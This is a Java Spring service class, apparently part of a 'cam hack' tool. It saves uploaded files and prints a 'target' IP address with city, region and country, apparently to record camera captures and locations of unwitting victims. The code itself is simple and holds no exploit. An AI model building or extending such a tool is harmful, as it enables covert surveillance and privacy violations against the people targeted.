package org.example;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

@Service
public class CamHackService {

    @Autowired
    HelperFunctions helperFunctions;

    public void saveFile(
            MultipartFile file){
        try{
            Path filePath = helperFunctions.getPathIfNotExists(file);
            Files.write(filePath, file.getBytes());
            System.out.println("file saved successfully at " + filePath);
        }catch (Exception e){
            System.out.println("error while saving file");
            //e.printStackTrace();
        }
    }

    public void getClientInfo(String clientIp,
                              String city,
                              String region,
                              String country){
        System.out.printf("""
                target ip : %s,
                target city : %s,
                target region : %s,
                target country : %s
                %n""", clientIp,city,region,country);
    }


}
